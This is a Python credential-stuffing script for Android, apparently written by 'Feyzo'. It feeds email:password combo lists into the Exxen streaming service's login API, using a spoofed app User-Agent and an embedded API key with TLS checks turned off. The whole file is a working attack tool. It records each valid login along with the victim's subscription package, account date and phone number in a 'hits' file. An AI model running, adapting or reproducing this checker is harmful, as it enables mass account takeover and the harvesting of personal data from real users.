import requests, datetime
import json,random,sys, time,os,re
import androidhelper as sl4a
import subprocess
import pathlib



import socket
subprocess.run(["clear", ""])
ad = sl4a.Android()
feyzo=("""
\33[32m▰▰▰▰ᴘʏᴛʜᴏɴ 🅧-🅟🅡🅞-ᴘʏ ᴄᴏɴғɪɢ▰▰▰▰       \33[33m                 
╔══════════════════════════════════        
║████  ████ ██ ░░ ██ ██████ ░ ████ ░░░         
║██ ░░ ██ ░░ ██  ██ ░░░░ ██ ░██ ░ ██ ░░        
║████  ████ ░ ████ ░░░ ██ ░ ██ ░░░ ██ ░     
║██ ░░ ██ ░░░░ ██ ░░ ██ ░░░░ ██ ░ ██ ░░      
║██ ░░ ████ ░░ ██ ░░ ██████ ░ ████ ░░░        
╚══════════════════════════════════                   
\33[32m▰▰▰▰ MAC PERRONA V2 ▰▰▰▰             \33[0m""")
print(feyzo) 
#ad = sl4a.Android()
import logging
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS="TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP"

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
ses= requests.Session()
logging.captureWarnings(True)

hit=0
pattern= "(00:\w{2}:79:\w{2}:\w{2}:\w{2})\n"
pattern= "(\w) "
if 1==1:
	say=0
	dsy=""
	dir='/sdcard/combo/'
	for files in os.listdir (dir):
		#if files.endswith(".txt"):
		say=say+1
		dsy=dsy+"	"+str(say)+"-) "+files+'\n'
	print ("""Aşağıdaki listeden combonuzu seçin!!!
"""+dsy+"""
\33[33mCombo klasörünüzde """ +str(say)+""" adet dosya bulundu !
""")
	dsyno=str(input(" \33[31mCombo No =\33[0m"))
	say=0
	for files in os.listdir (dir):
		#if files.endswith(".txt"):
		say=say+1
		if dsyno==str(say):
			dosyaa=(dir+files)
	say=0
	print(dosyaa) 
	combo=open(dosyaa,'r')
	totLen=combo.readlines()
	MacComboDosyaAdi=dosyaa
	#input("""
	#MAC combonuzun adını yazınız...!
	#	\33[1mDosya Adı=""") 
	dsy=dosyaa #/sdcard/'+MacComboDosyaAdi+'.txt'
subprocess.run(["clear", ""])
subprocess.run(["clear", ""])
print(feyzo) 
print(dosyaa)

DosyaA="/sdcard/" +"ExxenHits@Feyzo.txt"
def yaz(hits):
    dosya=open(DosyaA,'a+') 
    dosya.write(hits)
    dosya.close()
Hea={
"Accept-Language": "en-US;q=1.0",
"Accept-Encoding": "br;q=1.0, gzip;q=0.9, deflate;q=0.8",
"User-Agent": "com.exxen.android/1.0.2 (Android/5.1.1; tr_TR; brand/samsung; model/SM-G930L; build/NRD90M)" ,
"Connection": "keep-alive",
"Host": "api-crm.exxen.com",
"Origin": "com.exxen.android",
"Content-Length": "71",
"Content-Type": "application/json;charset=utf-8",
}

cpm=1

for mp in open(dosyaa,'r'):
	#print(mp)
	mp=mp.replace("\n","")
	user=mp.split(':')[0]
	pas=mp.split(':')[1]
#	print(user + "*" +pas)
	
	url="https://api-crm.exxen.com/membership/login/email?key=5f07276b91aa33e4bc446c54a9e982a8"
	data={'Email':user, 'Password':pas}
#	 "{\"us\":\"<USER>\",\"password\":\"<PASS>\"}" 
	res = ses.post(url, headers=Hea, data=json.dumps(data),timeout=15, verify=False)
	#print (res.content)
	veri=str(res.text)
	say=say+1
	cpm=(time.time()-cpm)
	cpm=(round(60/cpm))
	
	print ("\33[0m" +mp+" \n \33[32m EXXEN \033[96m   >>>>>Total:" + str(say)+ "\33[33m Hit:" + str(hit)+"\33[94m Cpm:" +str(cpm)+"\033[0m")
	cpm=time.time()
#	print(veri+'\n\n')
	if 'CreateDate' in veri:
	   sound="/sdcard/kemik_sesi.mp3"
	   file = pathlib.Path(sound) 
	   if file.exists ():
	   	ad.mediaPlay(sound)
	   hit=hit+1
	   reklam=""
	   if 'PackageName' in veri:
	   	rklm=veri.split('PackageName":"')[1]
	   	reklam=rklm.split('"')[0]
	   
	   strh=veri.split('CreateDate":"')[1]
	   strh=strh.split('"')[0]
	   
	   tel=veri.split('Number":"')[1]
	   tel=tel.split('"')[0]
	   
	   imza=("""
╔╣ᴘʏᴛʜᴏɴ -ᴘʏ ᴄᴏɴғɪɢ
╠●👩‍Email ➤ """+user+"""
╠●🔑Pass ➤ """+pas+"""
╠●🅵🅴🆈🆉🅾️
╠●💎Reklam➤"""+reklam+"""
╠●📆K.Trh ➤"""+strh+"""
╠●🔞Tel➤"""+tel+"""
╚ᴾʸᵗʰᵒⁿ ᴾʳᵒᵍʳᵃᵐᵐᵉʳ ᵇʸ ᶠᵉʸᶻᵒ╝
""")
	   print(imza+'\n')
	   yaz(imza+'\n')


	   
	   
	   
	   
	   
	   
	  
    
